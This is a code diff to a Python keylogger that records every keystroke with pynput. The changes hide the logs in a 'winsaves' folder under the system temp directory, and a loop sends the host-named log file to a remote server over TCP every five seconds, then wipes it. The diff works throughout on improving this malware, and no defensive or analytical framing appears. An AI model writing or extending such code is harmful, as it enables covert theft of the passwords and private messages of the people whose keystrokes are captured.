@@ -3,21 +3,26 @@ from pynput import keyboard
 import os
 import socket
 import time
+import tempfile
 
-# Setup thongs
 ENCODING = 'utf-8'
 pressed_keys = set()
 
 server_ip = ''
 server_port = 4500
 
+# Define the directory for saving files in the Windows temp directory
+winsaves_folder = os.path.join(tempfile.gettempdir(), "winsaves")
+os.makedirs(winsaves_folder, exist_ok=True)  # Create the folder if it doesn't exist
+
 hostname = socket.gethostname()
-file_name = f"{hostname}_last_key.txt"
+file_name = os.path.join(winsaves_folder, f"{hostname}_last_key.txt")
 
 # Create keystrokes.txt or nothing if already exists
 def create_keystrokes_file():
-    if not os.path.exists('keystrokes.txt'):
-        with open('keystrokes.txt', 'w') as file:
+    keystrokes_path = os.path.join(winsaves_folder, "keystrokes.txt")
+    if not os.path.exists(keystrokes_path):
+        with open(keystrokes_path, 'w') as file:
             pass
         print("Created a keystrokes.txt file to write in.")
     else:
@@ -25,9 +30,9 @@ def create_keystrokes_file():
 
 # The logic behind logging the keys
 def keylogger_callback(key):
-    
     global pressed_keys
-    
+
+    # Determine the key name
     if hasattr(key, 'char') and key.char is not None:  # Check for valid character
         name = key.char
     elif hasattr(key, 'vk'):  # Check for virtual character
@@ -46,21 +51,23 @@ def keylogger_callback(key):
 
     # Record the key press
     pressed_keys.add(name)
+
+    # Paths for the files
+    keystrokes_path = os.path.join(winsaves_folder, "keystrokes.txt")
     
-    # Write keystroke to keystrokes.txt and the file named after the host
+    # Write keystrokes to the files
     with open(file_name, 'a', encoding=ENCODING) as last_key_file:
         last_key_file.write(str(name) + '\n')
-    with open("keystrokes.txt", 'a', encoding=ENCODING) as last_key_file:
-        last_key_file.write(str(name) + '\n')
+    with open(keystrokes_path, 'a', encoding=ENCODING) as keystrokes_file:
+        keystrokes_file.write(str(name) + '\n')
 
-    # Check if keystrokes.txt exceeds 10 characters
-    with open("keystrokes.txt", 'r', encoding=ENCODING) as keystrokes_file:
+    # Trim keystrokes.txt if it exceeds 10,000 characters
+    with open(keystrokes_path, 'r', encoding=ENCODING) as keystrokes_file:
         content = keystrokes_file.read()
         if len(content) >= 10000:
             content = content[4:]
-            with open("keystrokes.txt", 'w', encoding=ENCODING) as keystrokes_file:
+            with open(keystrokes_path, 'w', encoding=ENCODING) as keystrokes_file:
                 keystrokes_file.write(content)
-            
 
 # Handles key release
 def on_release(key):
@@ -79,31 +86,37 @@ def run_listener():
 def send_last_key():
     while True:
         hostname = socket.gethostname()
-        file_name = f"{hostname}_last_key.txt"
+        # Get the file path within the "winsaves" directory
+        file_path = os.path.join(winsaves_folder, f"{hostname}_last_key.txt")
         
+        # Ensure we are only sending the base file name, not the full path
+        file_name = os.path.basename(file_path)  # This will get only the file name
+
         # Check if the file exists
-        if os.path.exists(file_name):
+        if os.path.exists(file_path):
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                 try:
                     client_socket.connect((server_ip, server_port))
                     print("Connected to server.")
 
-                    # Sends name information
+                    # Send only the base file name to the server
                     client_socket.send(len(file_name).to_bytes(4, byteorder='big'))
-                    client_socket.send(file_name.encode())
-                    with open(file_name, "rb") as file:
+                    client_socket.send(file_name.encode())  # Send just the file name, not the full path
+                    
+                    # Send the file content
+                    with open(file_path, "rb") as file:
                         file_data = file.read()
 
-                    # Sends the file
+                    # Send the file content length and the actual file data
                     client_socket.send(len(file_data).to_bytes(8, byteorder='big'))
                     client_socket.send(file_data)
 
-                    print("File sent successfully.")
+                    print(f"File {file_name} sent successfully.")  # Display the file name being sent
                 except Exception as e:
-                    print(f"Error: {e}") 
+                    print(f"Error: {e}")  # Handle error during file sending
 
-            # Clear the contents for new keylogs
-            open(file_name, 'w').close()
+            # Clear the contents of the file for new key logs
+            open(file_path, 'w').close()
 
         # Sleep for 5 seconds before sending again
         time.sleep(5)
